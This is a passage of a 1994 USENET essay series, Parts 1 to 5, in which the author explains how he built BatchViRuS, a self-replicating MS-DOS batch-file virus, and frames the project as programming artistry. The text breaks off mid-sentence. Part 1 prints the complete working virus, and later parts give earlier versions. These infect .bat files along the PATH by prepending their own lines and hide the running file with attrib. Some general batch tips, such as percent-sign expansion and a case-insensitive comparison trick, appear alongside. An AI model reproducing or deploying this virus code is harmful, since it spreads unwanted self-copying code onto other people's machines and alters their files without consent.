
-------------------------------------------------------------
These are the texts of the series 'The Hidden Strengths of
the Dos Batch Language' (treating the subjects of artistry in
programming, advanced MS-DOS batch writing, and computer
viruses), almost exactly as they appeared on the USENET group
comp.os.msdos.programmer, during the autumn of 1994. A few 
changes were made to them afterwards, mostly corrections of
bad spelling and style. You are free to copy and redistribute 
this document in electronic form, if you leave it unchanged.
-------------------------------------------------------------


PART 1 
(4 Oct. 1994)

Writing a computer virus is a bit like planning the perfect
murder. Some very amiable and peaceful people like to plan the
ultimate crime just for the intellectual pleasure: afterwards
they don't execute their plan, but write a story or a novel
about it. Likewise, I believe, there are many nice and decent
hackers in the world that spend their evenings programming the
perfect virus, only to prove to themselves and to a few
friends that they can do it. I did it: now I am writing the
story. It will appear in eight to ten weekly episodes on this
newsgroup. Comments are much appreciated.


	The Hidden Strengths of the Dos Batch Language

			      and
			   a preface
			     about

		     Programming as an Art.


Art lies in self-limitation. Every kind of artistic expression
is an activity within strict limits. For a painter, the most
obvious limit is the edge of the canvas. For a sculptor, there
are the physical properties of his material. The narrower the
limits are, the greater the opportunity for the artist to
prove his skills. A painter who can paint beautiful sceneries
using only two colours of paint, proves he can do without the
others. To do without is the essence of art.

Modern programming does not have to do without any more.
Elaborate programming languages, with all kinds of handy
graphics libraries, object-oriented of course, and nice
prototyping tools, have made developing large applications
easier than ever. But they have also taken away the art and
the fun.

Trying to recapture the fun, I ventured on the weirdest
programming job I had ever tackled: I decided to write a
virus, maybe the most difficult of programs (complexity/size)
in DOS batch language, surely the most ridiculous of programming
languages. The idea had hounded me for years, but never had
I been able to work it out into a practicable and working
program. The difficulties were manyfold: the primitivity of
the IF command; the complete absence of string manipulation
functions (for file names); the simplicity of the environment
variables; the minimalist nature of standard file manipulation
tools (only SORT and FIND) and certainly not least, the absence
of a random generator. Some of the difficulties I have solved,
most of them I have worked around.

In the following pages, I will first give you the complete
code of the last of the eighteen or more versions -- I must
have thrown some away -- being the one that I am most satisfied
with, and also the most complicated. After that, I will step by
step explain the history of the eighteen versions, often
systematically rather than strictly chronologically, and of
course a bit edited and dramatized. I will write this way to
show how the program came into existence and grew from a
simple idea into what will probably stay the most complicated
batch file of my hacking career.

I hope you will be willing to bear with me as I explain the
process of creation of the BatchViRuS, trying to recapture my
train of thoughts of those days. I also hope that I may be
able to make you see the art and fun in stretching the limits
of primitive programming environments. I am sure, however,
that even the most hardened batch programmer will discover
something about DOS he didn't yet know, just as there are many
things I still have to discover. On the other hand, as I
intend to write for relatively inexperienced programmers too,
I will at moments explain things that may seem elementary to
some. This being said to my defense, here is your first peek
at the full code:

---------------------------

@echo off>nul.ViRuS
rem ViRuS The BatchViRuS by Dirk van Deun 1994
rem ViRuS May be copied freely (On your own machine !)
rem ViRuS Programmed to prove that it's possible
rem ViRuS (and to show off skill in writing batchfiles)
rem ViRuS If you have no disk cache, you're not interested ;-)
rem ViRuS E-mail hw41652@vub.ac.be

rem ViRuS Known bug: interpretation of variables may make lines too long 
rem ViRuS for DOS and let characters drop off: unpredictable behaviour

if "%0==" echo --------------------------------------->con.ViRuS
if "%0==" echo |   Hi ! I am the nice BatchViRuS !   |
if "%0==" echo --------------------------------------->con.ViRuS
if "%0==" goto ViRuS_OLDBAT
if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
if "%1=="/ViRuS_PARSEPATH goto ViRuS_parsepath
if "%1=="/ViRuS_FINDSELF goto ViRuS_findself
if "%VOFF%=="T goto ViRuS_OLDBAT

set ViRuSname=%0
if not exist %0.bat command /e:10000 /c %0 /ViRuS_FINDSELF %path%
if not exist %0.bat call xViRuSx
if not exist %0.bat del xViRuSx.bat
if not exist %ViRuSname%.bat set ViRuSname=
if "%ViRuSname%==" goto ViRuS_OLDBAT

rem ViRuS if batch is started with name.BAT, virus will not become active
rem ViRuS it was a bug, now it's a feature ! (also notice the voff variable)
rem ViRuS also if batch was only in an append /x:on path (chance=minimal)
rem ViRuS or if environment is too small to contain %ViRuSname% !

if "%VPATH%==" set VPATH=%PATH%>nul.ViRuS
rem (if environment cannot hold VPATH, ViRuS will function partially)
command /e:10000 /c %0 /ViRuS_PARSEPATH %VPATH%
call xViRuSx
del xViRuSx.bat
if "%VPATH%==" set VPATH=.>nul.ViRuS
set ViRuSname=
goto ViRuS_OLDBAT

:ViRuS_findself
if "%2==" echo.>xViRuSx.bat
if "%2==" exit>nul.ViRuS
if exist %2\%ViRuSname%.bat echo set ViRuSname=%2\%ViRuSname%>xViRuSx.bat
if exist %2\%ViRuSname%.bat exit
if exist %2%ViRuSname%.bat echo set ViRuSname=%2%ViRuSname%>xViRuSx.bat
if exist %2%ViRuSname%.bat exit
shift>nul.ViRuS
goto ViRuS_findself

:ViRuS_parsepath
for %%a in (%2\*.bat;%2*.bat) do command /e:10000 /c %ViRuSname% /ViRuS_MULTIPLY %%a
for %%a in (%2\*.bat;%2*.bat) do goto ViRuS_new_vpath
shift>nul.ViRuS
if not "%2==" goto ViRuS_parsepath
if not "%1==". for %%a in (.\*.bat) do command /e:10000 /c %ViRuSname% /ViRuS_MULTIPLY %%a
:ViRuS_new_vpath
set VPATH=%3>nul.ViRuS
:ViRuS_loop
shift>nul.ViRuS
if "%3==" echo set VPATH=%VPATH%>xViRuSx.bat
if "%3==" exit>nul.ViRuS
set VPATH=%VPATH%;%3>nul.ViRuS
goto ViRuS_loop

:ViRuS_multiply
echo Checking: %2>con.ViRuS
find "SeT IchBin=%%0" <%2>xViRuSx.bat
call xViRuSx
del xViRuSx.bat
if "%IchBin%=="xViRuSx exit
find "ViRuS" <%ViRuSname%.bat>xViRuSx.bat
type %2>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat
echo Infecting: %2>con.ViRuS
exit>nul.ViRuS

rem data for the first find in ViRuS_multiply
SeT IchBin=%0>nul.ViRuS

:ViRuS_OLDBAT
echo on>nul.ViRuS
echo This is the dummy original batch

---------------------------

Such was the final version of my BatchViRuS. The reason I
spell ViRuS with the three capitals will be clear to those who
have already looked at the code more thoroughly. Maybe, to
experienced batch writers, many things will have seemed self-
evident as they read them. I assure you, that they were
not so to me as I still had to invent them. This account is
primarily about programming in difficult circumstances; about
doing without.

To be continued...


PART 2
(12 Oct. 1994)

Writing a computer virus is a bit like planning the perfect
murder. Some very amiable and peaceful people like to plan the
ultimate crime just for the intellectual pleasure: afterwards
they don't execute their plan, but write a story or a novel
about it. Likewise, I believe, there are many nice and decent
hackers in the world that spend their evenings programming the
perfect virus, only to prove to themselves and to a few
friends that they can do it. I did it: now I am writing the
story. It will appear in eight to ten weekly episodes on this
newsgroup. Comments are much appreciated.


	The Hidden Strengths of the Dos Batch Language

			   Part II:
		    Genesis, or: The Basics


The most important thing in the life of a virus is to infect
as many programs as possible. To infect, it must be able to
separate itself from its actual carrier, to copy itself, and
to paste its copy into another carrier. This little program,
infect.bat, will paste itself to the beginning of another
program, of which the name is passed as parameter %1.

find "ViRuS" <%0.bat >%0.vvv
find /v "ViRuS" <%1 >>%0.vvv
copy %0.vvv %1 |rem ViRuS
del %0.vvv     |rem ViRuS
 
These four little lines, which I wrote on an equally little
piece of paper during an inspired moment quite some years
ago -- a moment of complete boredom going by train from
Turnhout to Brussels without a good book for the trip -- had
given me hope that a virus of MS-DOS commands was possible.
Not only did these lines reproduce themselves, they also took
care that any old version of the virus was deleted from the
target file, which was necessary back then, because I only
discovered very late in the process how to let the virus
recognize itself in another file, and refrain from adding
itself a second time.

Adding '|rem ViRuS' to every line that didn't have the
signature string 'ViRuS' in them, was a simple way of letting
FIND distinguish the virus from the carrier, but it had
certain disadvantages. One of these disadvantages was, that it
was not possible to add such a REM statement to commands that
write to standard output, without making that output
disappear: the output went to REM as input through the pipe
and REM did nothing with it. But more importantly, it slowed
down execution of the batch, because for every pipe, DOS
created a temporary disk file for standard output, which it
deletes after execution of the second piped command.

There was a better way to incorporate the word 'ViRuS' into
many lines of the future virus. It is common practice to add
'>nul' to COPY commands in batch files, to suppress the
message 'x file(s) copied'. A less known fact about the NUL
device (and about all character devices) is that you can add
any extension you like to it, without changing the function.
This way, you can also send the output of COPY to nul.bat,
or to nul.com, or to nul.whatever (=nul.wha). So I decided to
send the output of the COPY command to nul.ViRuS, and this
method of incorporating the signature string I extended to
commands that don't write to standard output at all. Now DOS
didn't create a intermediate files any more, and infect.bat
presently looked like this:

find "ViRuS" <%0.bat >%0.vvv
find /v "ViRuS" <%1 >>%0.vvv
copy %0.vvv %1>nul.ViRuS
del %0.vvv>nul.ViRuS

Of course, what was needed was not a program that infected one
particular file, and certainly not a file of which the name
was passed as first parameter of the batch, because the user
of the batch file would certainly not be so friendly as to
provide a filename. 'FOR %%a IN (*.BAT) do {the 4 commands}'
would be a definite improvement. The 4 commands were put into
a procedure. At the same time, I replaced '%0.vvv' everywhere
with 'xViRuSx.bat', which had the advantage of having the
signature string in it, and was also very unlikely to be the
name of an existing file:

if "%1=="/ViRuS_THE_PROCEDURE goto ViRuS_the_procedure
for %%a in (*.bat) do call %0 /ViRuS_THE_PROCEDURE %%a
goto ViRuS_OLDBAT
:ViRuS_the_procedure
find "ViRuS" <%0.bat >xViRuSx.bat
find /v "ViRuS" <%2 >>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat
goto XXX_END>nul.ViRuS
:ViRuS_OLDBAT
{the original batch file}
:XXX_END

---------------------------

Procedures for batch files are best implemented as pieces of
code that can be called by 'call %0' with a switch parameter.
A series of IF commands at the begin of the batch (I usually
call this part of the code the procedure dispatcher) recognize
the parameter and jump to the right block of code. The last
command of each procedure block is a GOTO to the end of file,
and the 'main program' ends with a GOTO that jumps over the
procedures; so in this particular case, to the place where the
original uninfected batch file is fitted in. This is an
important technique of advanced batch writing, so I'll
illustrate the principle with a simpler example:

@echo off
if "%1=="/A goto A
if "%1=="/B goto B
rem Main Program
call %0 /A
call %0 /B
goto END
:A
echo AAA
goto END
:B
echo BBB
goto END
:END

By the way, I write 'if "%1=="/A ...' and not 'if %1==/A ...'
because if there are no command line parameters, %1 will be
empty, and 'if %1==/A' will expand to (i.e. be interpreted as)
'if ==/A', with nothing at the left of the == operator. This
is considered a syntax error. 

---------------------------

Let's go back to the virus. Notice how I had incorporated the
signature 'ViRuS' in all lines, except in the last one. I
didn't put the signature into that line, because this line had
to be placed at the very end of the new, infected files, under
the original batch; so it should not be found by the FIND
commands, as FIND would insert the line at the wrong place.
On the other hand, the line had to be reproduced some way, and
old copies of it had to be deleted from the target file at
infection time, otherwise there would soon be scores of
':XXX_END'-lines at the end of an often-infected file. So I
changed the multiplication procedure to:

:ViRuS_the_procedure
find "ViRuS" <%0.bat >xViRuSx.bat
find /v "ViRuS" <%2 |find /v ":XXX_END" >>xViRuSx.bat
echo :XXX_END>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat
goto XXX_END>nul.ViRuS

After adding an 'echo off' and an 'echo on', the first working
version was ready:

@ECHO OFF>nul.ViRuS
if "%1=="/ViRuS_THE_PROCEDURE goto ViRuS_the_procedure
for %%a in (*.bat) do call %0 /ViRuS_THE_PROCEDURE %%a
goto ViRuS_OLDBAT
:ViRuS_the_procedure
find "ViRuS" <%0.bat >xViRuSx.bat
find /v "ViRuS" <%2 |find /v ":XXX_END" >>xViRuSx.bat
echo :XXX_END>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat>nul.ViRuS
goto XXX_END>nul.ViRuS
:ViRuS_OLDBAT
ECHO ON>nul.ViRuS
echo This is the dummy original batch
:XXX_END

To my initial surprise, I could add '>nul.ViRuS' to 'echo off'
and 'echo on', without changing their effect.

---------------------------

It is evident that a virus that only infects files in the
current directory will not spread very effectively. A first
improvement was a new FOR loop that let the virus search
files to infect in all directories of the PATH variable, plus
in the current directory. If MS-DOS would have allowed nested
loops, I would only have had to change the line:
     for %%a in (*.bat) do call %0 /ViRuS_THE_PROCEDURE %%a
to:
     for %%b in (%path% .) do 
       for %%a in (%%b\*.bat) do call /ViRuS_THE_PROCEDURE %%a

As it is, MS-DOS doesn't allow nested loops. I worked around
this using a new procedure call:

@echo off>nul.ViRuS
if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
if "%1=="/ViRuS_OUTER_LOOP goto ViRuS_outer_loop
for %%a in (%path%;.) do call %0 /ViRuS_OUTER_LOOP %%a
goto ViRuS_OLDBAT
:ViRuS_outer_loop
for %%a in (%2\*.bat) do call %0 /ViRuS_MULTIPLY %%a
goto XXX_END>nul.ViRuS
:ViRuS_multiply
...

There is one bug left (or Unexpected Feature, in politically
correct lingo): on a machine with a system path like
'c:\dos;c:\batch;c:\', '%2\*.bat' would expand, correctly,
to 'c:\dos\*.bat', then to 'c:\batch\*.bat', but thirdly to
'c:\\*.bat', with two backslashes. To fix this, I replaced
'%2\*.bat' with '%2\*.bat ; %2*.bat', a combination that
catches all possibilities:

@echo off>nul.ViRuS
if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
if "%1=="/ViRuS_OUTER_LOOP goto ViRuS_outer_loop
for %%a in (%path%;.) do call %0 /ViRuS_OUTER_LOOP %%a
goto ViRuS_OLDBAT
:ViRuS_outer_loop
for %%a in (%2\*.bat;%2*.bat) do call %0 /ViRuS_MULTIPLY %%a
goto XXX_END>nul.ViRuS
:ViRuS_multiply
(...)
goto XXX_END>nul.ViRuS
:ViRuS_OLDBAT
(...)
:XXX_END

---------------------------

At that point for the first time I sat back and looked at what
I had accomplished. I was pretty sure I had solved most of the
difficulties. The rest would only be refinement. And indeed
this version of the BatchViRuS contained what could be called
the framework of all versions that followed. But there was
still much more to do than I could imagine at that time.
Little did I suspect that the code would grow to be about four
times its present length. The rest of this essay will tell of
everything I did to make the virus work correctly in all
circumstances and to make it infect files more efficiently.
Because as I discovered soon, this version wouldn't do at all.

To be continued...                       For old episodes finger
					 hw41652@is1.vub.ac.be

PART 3
(19 Oct. 1994)

Writing a computer virus is a bit like planning the perfect
murder. Some very amiable and peaceful people like to plan the
ultimate crime just for the intellectual pleasure: afterwards
they don't execute their plan, but write a story or a novel
about it. Likewise, I believe, there are many nice and decent
hackers in the world that spend their evenings programming the
perfect virus, only to prove to themselves and to a few
friends that they can do it. I did it: now I am writing the
story. It will appear in eight to ten weekly episodes on this
newsgroup. Comments are much appreciated.


	The Hidden Strengths of the Dos Batch Language

			   Part III:
		The Trouble with %0 / Upcase()


The present implementation was really too slow, as it took
several minutes (on my 486 PC with a rather average hard disk
and a disk cache) to reinfect all those files every time an
infected batch was run, but I moved on to a more pressing
problem. Till this moment, I hadn't done much realistic
testing; indeed, in this stage, I hadn't once left the virus
really 'run loose' on my computer. Now it occurred to me that
disaster could very well strike if a file tried to infect
itself, although I hadn't yet seen it happen. If a user had
for instance added a line to the batch file, albeit an empty
line, above the virus, this line would be moved during the
reinfection. MS-DOS would very probably not like it if I
meddled with a file that was opened by command.com for input
at the same moment.

I don't remember how long it took me to think of manipulating
file attributes to hide the active batch file from itself, but
the simplicity of the idea immediately appealed to me. I did
not want to complicate the multiply procedure with extra IF's
and GOTO's, to hold the virus from trying to infect itself, so
I was glad I could achieve the same goal with only two lines
around the main program:

attrib +h %0.bat>nul.ViRuS
for %%a in (%path%;.) do call %0 /ViRuS_OUTER_LOOP %%a
attrib -h %0.bat>nul.ViRuS

Then a little voice in my head reminded me of something silly
I had seen a newbie do: he started batch files with the full
name of the file: e.g. not TETRIS but TETRIS.BAT. What would
happen if an infected file was run this way ? What exactly was
the expanded value of %0 ?

The manual says that %1 till %9 are expanded to the first till
the ninth command line parameter, and that %0 is expanded to
'the name of the batch file without .bat'. But is that also
true if the batch is started the newbie way ? I tested it with
a batch file called whoami.bat, containing the one line:

@echo %0

I tried 'whoami' and it said 'whoami'. Bad news: it answered
in small letters, not in capitals, so the file name was
probably not preprocessed. I tried 'whoami.bat' and it said
'whoami.bat'. I tried 'whoami.bathroom' and it said
'whoami.bathroom'. The perfect parrot. Now I was really glad
that I had used the ATTRIB method to stop the virus from
overwriting itself, because the method with the IF's would not
have worked: the FOR loops generate file names in all
capital letters, and users usually type their commands in
small letters. The DOS == operator does not recognize upper-
and lowercase letters as being the same.

---------------------------

Actually, there is a little trick to emulate an upcase()
function in MS-DOS batches, and make case independent ==
possible. I didn't use it in any of the versions of the virus,
but as this essay is called 'The Hidden Strengths of the Dos
Batch Language', I will digress and explain it. It is not my
own invention; as a matter of fact, if I remembered who taught
me, I would mention him or her as an example of inventiveness.
As I realize that some insight into the preprocessing of
percent sign operators in batches will be necessary, I begin
with a digression in a digression.

DOS handbooks always tell you that the variable in a FOR loop
has to be a percent sign plus a letter when you type it at the
prompt, and two percent signs plus a letter in batch files.
However, in no book have I ever read why. Also, you can use
%variable_name% to access environment variables in batches,
but not at the prompt. Again, none of the numerous books I
have skimmed on the subject tells why not. As we all know, the
third use for percent signs is in command line parameter
variables (%0...%9). Finally, experimentation shows that, in
batches, 'echo %%' displays only one percent sign, so that
'echo %%2' is the way to display '%2' literally, not command
line parameter 2. These four facts will have to be combined
into one Grand Unified Theory for better understanding.

I just said that no handbook offers an explanation why two
percent signs are necessary for FOR loop variables in
batches. Actually, one book did say something on the subject.
It told me that this was to prevent confusion with the command
line parameter variables %0 to %9. Well, it is true that the
double percent sign prevents confusion, but the explanation is
at best partially correct.

Watching the output of batches with 'echo' on brought the
answer: DOS preprocesses all combinations with percent signs
before execution of the command, even before it is echoed on
display. So 'echo %%' will be echoed on screen as 'C:\>echo %'
(sic), followed on the next line by the output '%'. Also, 'for
%%a in () do echo %%a' is displayed as 'C:\>for %a in () do
echo %a'. This means that the FOR command does not suddenly
ask for two percent signs in its parameter if used in batches,
but that the two percent signs are necessary to make the
preprocessor let pass one.

It also follows that the reason why you cannot access
environment variables from the command line, and the reason
that 'echo %%' at the command line really does display two
percent signs, is that this preprocessing cycle is present
only in batch processing. All strange properties of percent
sign sequences are thus explicable.

---------------------------

Now let's get back to the upcase() trick. The brilliant idea
behind it is that DOS internally has an upcase() function, to
which it does not give access to programmers. You can see this
function in action on quite some occasions, like when you set
an environment variable. Indeed, DOS always converts the name
of the variable to capitals: 'set a=b' makes a variable named
'A', with value 'b'.

The following batch file, compare.bat, makes clever use of
this, by creating an environment variable named after (the
upper case version of) one of the two words that have to be
compared, and as value a test string. Then it checks whether
there exists a variable named after (the upper case version
of) the second word, and as value the test string. If one
does, the two words are the same. Finding out why the checking
has to happen in such a complicated way (lines 4 & 5), I leave
as an exercise for the reader and as a puzzle to test his or
her insight in the Grand Unified Theory of Percent Signs in
Batches.

(I fear that trying to explain in detail would only make it
more obscure; I myself only understood it after staring at the
code for a minute or so, and then it seemed so simple...)

@echo off
if "%2==" goto end
set %1=anyteststring
echo if "%%%2%%=="anyteststring echo Same Thing !>compare2.bat
call compare2
del compare2.bat
set %1=
:end

Of course, in real applications the conditional command will
not be 'echo Same Thing !' but often the setting of a Boolean
variable for further use: 'set same=T'.

---------------------------

But all that still leaves the Problem of the Silly Newbie
User. Although for DOS the file names 'virus.bat' and
'virus.bathroom' are equivalent, 'virus.bat.bat' is not
recognized as being the same. The point upsets DOS. And if a
batch carrying a virus was run the newbie way, the file name
in 'attrib -h %0.bat' would expand to something ending on
.bat.bat . To catch all possibilities, I considered extensive
testing, like this:

if exist %0.bat attrib +h %0.bat >nul.ViRuS
if not exist %0.bat attrib +h %0 >nul.ViRuS
(...)
if exist %0.bat attrib -h %0.bat >nul.ViRuS
if not exist %0.bat attrib -h %0 >nul.ViRuS

Some way or other, it didn't seem an elegant solution. It was
hate at first sight. As I considered the problem unimportant
("Let's not bother with a few newbies") I left the program as
it was before, except that at the begin I added the line:

if not exist %0.bat goto ViRuS_OLDBAT

This way, if the virus couldn't find itself back as %0.bat, it
bailed out and left the original batch execute. It was also
this line of code that attracted my attention to an unforeseen
problem while testing.

During one of the tests, I typed 'virus' to start my most
recent test version, but nothing seemed to happen. I got no
'Bad command or file name', so the batch file had been
executed. Nor had I typed 'virus.bat', so the newly added line
should not be the problem. It was.

I had executed the batch from another directory. DOS had found
the batch for me, because it was located in a directory of the
system path, but the batch couldn't find itself back. My
current directory was the root, and virus.bat was in \tmp. DOS
knew where to find virus.bat, executed it, but the stupid
batch (the 'if exist') then searched itself in the root. It
didn't find anything, of course, and it quit. If I were a
drinker, that would have been the moment to open a bottle. As
it was, I shut off the computer and munched some chocolate.

To be continued...                       For old episodes finger
					 hw41652@is1.vub.ac.be

PART 4
(26 Oct. 1994)

Writing a computer virus is a bit like planning the perfect
murder. Some very amiable and peaceful people like to plan the
ultimate crime just for the intellectual pleasure: afterwards
they don't execute their plan, but write a story or a novel
about it. Likewise, I believe, there are many nice and decent
hackers in the world that spend their evenings programming the
perfect virus, only to prove to themselves and to a few
friends that they can do it. I did it: now I am writing the
story. It will appear in eight to ten weekly episodes on this
newsgroup. Comments are much appreciated.


	The Hidden Strengths of the Dos Batch Language

			   Part IV:
		    On How to Find Yourself


This was the worst case of Being Stuck of the whole project.
The virus really needed to know its own location, if not to be
able to protect itself from overwriting, certainly as input
for the FIND command that separated the virus from its
carrier. There was no getting around it: I had to devise some
method to let the virus search the system path too, like DOS
did when it executed the batch.

It seemed a hell of a task to embed all lines that contained
'%0' in 'for %%a in (. %path%) do if exist...' constructions,
for some lines the more so because DOS processes redirections
at the end of a compound command early. To show you what I
mean by that: the next line, a reasonable being would suppose,
will sort a.dat to standard output if it exists and do nothing
if it does not exist:

if exist a.dat sort <a.dat

In contrast, the unreasonable computer will display an error
message if a.dat does not exist. DOS evaluates the <a.bat
before the 'exist', and so if there is no a.bat, DOS snorts:
'File not found'. The only way around that, is to split up 
command, so that the line containing the redirection
instruction will not be processed if there is no a.dat:

if NOT exist a.dat goto hell
sort <a.dat
:hell

I didn't like the way this was going. The code was getting way
too fat. Luckily, the Muses came to my help. They spoke to me
in my sleep: 'Dirk, thou shalt do this work but once and put
the results in an environment variable.' (Didn't I promise in
the preface I would dramatize the account a bit ?) Anyway, I
grabbed a piece of paper and a pencil (never go to bed without
them), and jotted down the great idea. And unlike most great
ideas you write down half-sleepingly, this one was still great
in the morning.

So I first tried:

set ViRuSname=%0
if not exist %0.bat for %%a in (%path%) do call %0 /ViRuS_FINDSELF %%a

together with the following procedure (I will not now bother
you with the new line in the procedure dispatcher block):

:ViRuS_findself
if exist %2\%0.bat set ViRuSname=%2\%0
if exist %2%0.bat set ViRuSname=%2%0
goto XXX_END>nul.ViRuS

However, there was an unexpected flaw in this approach: I had
a very long system path, and the line 'if not exist %0.bat for
%%a in (%path%) do ...' was expanded at runtime into something
that extended beyond the maximum length for DOS commands, so
that letters fell off at the end ! This was a rather weird
bug, and I only discovered it during some tiresome tracing
through the pages and pages of output the virus produced when
I disabled the 'echo off'. Unconventional bugs require
unconventional measures, so I could do nothing but try to
shorten the line that had %path% in it, and if possible put
%path% only at the ends of lines, so that if something fell
off, no serious damage was done (it only increased the
probability that the virus would not find itself). Let's skip 
some trials and go straight to the final version:

set ViRuSname=%0
if not exist %0.bat call %0 /ViRuS_FINDSELF %path%

:ViRuS_findself
if "%2==" goto XXX_END>nul.ViRuS
if exist %2\%ViRuSname%.bat set ViRuSname=%2\%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
shift>nul.ViRuS
goto ViRuS_findself

In high-level terms, I had replaced the FOR loop with a 
'while' loop. In the first version, the FOR command had been
responsible for splitting %path% in its components: each
component of the path would be %%a for one passage of the
loop. Now it was up to the procedure ViRuS_findself to do the
splitting up. It was a strangely lucid moment when I saw that
if I let the CALL statement contain %path% as a parameter, MS-
DOS would do the carving for me, because the semicolons in the
path are separators for MS-DOS: 'call %0 /ViRuS_FINDSELF
%path%' would not cause %path% to be put into %2 for the
CALLed copy of virus.bat, but %path% would be divided over
%2 %3 %4 %5... (%1 = /ViRuS_FINDSELF).

After this procedure was ready, I replaced all %0's by
%ViRuSname%'s (except in call statements, where it wasn't
necessary), and I rewrote a few lines to make sure that the
variable ViRuSname would be reset on terminating. The first
and worst crisis was over. I printed a copy of the whole
program, shut off the computer and, very irrelevantly, went to
a school reunion:

@echo off>nul.ViRuS
if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
if "%1=="/ViRuS_OUTER_LOOP goto ViRuS_outer_loop
if "%1=="/ViRuS_FINDSELF goto ViRuS_findself
if "%VOFF%=="T goto ViRuS_OLDBAT

set ViRuSname=%0
if not exist %0.bat call %0 /ViRuS_FINDSELF %path%
if not exist %ViRuSname%.bat set ViRuSname=
if "%ViRuSname%==" goto ViRuS_OLDBAT

rem ViRuS if batch is started with name.BAT, virus will not become active
rem ViRuS it was a bug, now it's a feature ! (also notice the voff variable)
rem ViRuS also if batch was only in an append /x:on path (chance=minimal)

attrib +h %ViRuSname%.bat
for %%a in (%path%;.) do call %0 /ViRuS_OUTER_LOOP %%a
attrib -h %ViRuSname%.bat
set ViRuSname=
goto ViRuS_OLDBAT

:ViRuS_findself
if "%2==" goto XXX_END>nul.ViRuS
if exist %2\%ViRuSname%.bat set ViRuSname=%2\%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
shift>nul.ViRuS
goto ViRuS_findself

:ViRuS_outer_loop
for %%a in (%2\*.bat;%2*.bat) do call %0 /ViRuS_MULTIPLY %%a
goto XXX_END>nul.ViRuS

:ViRuS_multiply
find "ViRuS" <%ViRuSname%.bat >xViRuSx.bat
find /v "ViRuS" <%2 |find /v ":XXX_END" >>xViRuSx.bat
echo :XXX_END>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat
goto XXX_END>nul.ViRuS

:ViRuS_OLDBAT
echo on>nul.ViRuS
echo This is the dummy original batch
:XXX_END

---------------------------

It was a pity Thomas wasn't present at the reunion. To him, I
could have bragged about my new program. Now there was nobody
who would have had the slightest idea what I was speaking
about, so I talked with some people about my studies in
classical philology. Somehow, most people seem more at ease
when you talk to them about Plato and Caesar, than when you
talk about computers. Well, anyway, I was pretty proud of my
hacking and the next morning I made another, high-quality
printout to keep in my archives.

To be continued...                       For old episodes finger
					 hw41652@is1.vub.ac.be

PART 5
(3 Nov. 1994)

Writing a computer virus is a bit like planning the perfect
murder. Some very amiable and peaceful people like to plan the
ultimate crime just for the intellectual pleasure: afterwards
they don't execute their plan, but write a story or a novel
about it. Likewise, I believe, there are many nice and decent
hackers in the world that spend their evenings programming the
perfect virus, only to prove to themselves and to a few
friends that they can do it. I did it: now I am writing the
story. It will appear in eight to ten weekly episodes on this
newsgroup. Comments are much appreciated.


	The Hidden Strengths of the Dos Batch Language

			    Part V:
	      Infection Strategies / %0 Revisited


Now it was time to find a way to speed things up. Every time
an infected batch file was run, it took about two minutes to
reinfect all other batches it could find. I had already added
a test 'if "%VOFF%=="T goto ViRuS_OLDBAT', so I could easily
disable the virus, which was now all over my disk, by setting
an environment variable, because it was getting on my nerves.

Normal link-virusses infect only one other file at a time, so
that the user doesn't notice the delay in execution of his
programs. Now could I let the BatchViRuS do the same ?

Maybe I could, maybe I couldn't. I remember having written
some versions that infected only one batch at a time, but they
were quite complicated, needed lots of environment variables
to remember and communicate which directory was being
processed, and what was the last processed file, that all this
slowed down the computer almost as much as the old version;
especially because I still had to use (quite complicated) FOR
loops to simulate the findfirst and findnext functions.

Also, as I could use no random generator, every time the
computer was switched off and on, infection began again with
the first batch file in the first directory of the system
path. I could of course save the variables to a file, but it
would be in constant danger of being deleted; also this was
yet another complication. Infecting on file-by-file basis
seemed not to be the solution.

---------------------------

I just said I could 'of course' save the variables to a file,
but maybe some explanation is in place here, on how exactly I
would save the contents of an environment variable to a file.

Environment variables can be saved to a disk file as SET
commands. You give the file the .bat-extension, and to reload
the variables, you just execute the batch file (with CALL if
from another batch file). If I would want to save the system
path, for example, I would do so as follows:

     echo set path=%path% > savefile.bat

This can only be done from a batch file, not from the prompt
(see Part III on this subject), but reloading the variables
can be done by typing 'savefile' at the prompt as well as by
'call savefile' from another batch.

---------------------------

Infecting whole directories at a time looked like a good
compromise. The user would notice that something was going on
of course, but I didn't intend to use the virus on innocent
victims anyway; and infecting whole directories would
guarantee efficient multiplication, while reducing wasted time
considerably for the user, compared with the old version.
If I included a line like 'echo Now infecting: xxxxxxxx.bat',
time would seem to pass quickly as the user sat watching his
screen in unprecedented and unparalleled admiration.

For someone who wanted only to prove the theoretical
possibility of a virus in batch language, this was more than
good enough, even when, for the rest, I always tried to make
the virus as realistic as possible. (Anyway, when everybody
will have a Hexium PC with super-fast hard disk, the trouble
will have solved itself, for the directory-by-directory as
well as for the file-by-file approach, which proves that this
is only a practical, not a fundamental problem.)

I intended the virus to start infecting in the first directory
of the path every time the computer was reset, and to process
a part of the rest of the path every time an infected batch
was run. When the whole path had been processed, the virus
could infect everything in the current directory every time it
was run; an inefficient way, but the only way, to infect
directories not in the path.

---------------------------

Recently I downloaded Timo Salmi's batch trick collection, and 
among a lot of really interesting stuff, I saw a very 
complicated batch file that promised to be able to search all 
files that fitted a specified template, *.bat for example, in 
all directories of a file system, and pass their full 
pathnames as parameters to any command. This of course would 
be a valuable addition to the virus, so I tried it right away. 
It didn't work. 

I stared at the source code for maybe a quarter of an hour,
but then it dawned on me: the batch uses the output of some
DOS commands in a very ingenious way, and for that purpose it
expects these messages to be in English. On my own computer at
home I have a Dutch version of DOS, and this ruined the whole
plan. I could probably make a version of the trick that works
on my computer, but certainly no universal version. That is 
why the current version of the virus is still limited to 
infecting the system path plus the current directory.

---------------------------

The different copies of the virus had to communicate where
they had left off, or better still where the next had to
begin. Therefore, I invented VPATH, the smaller brother of
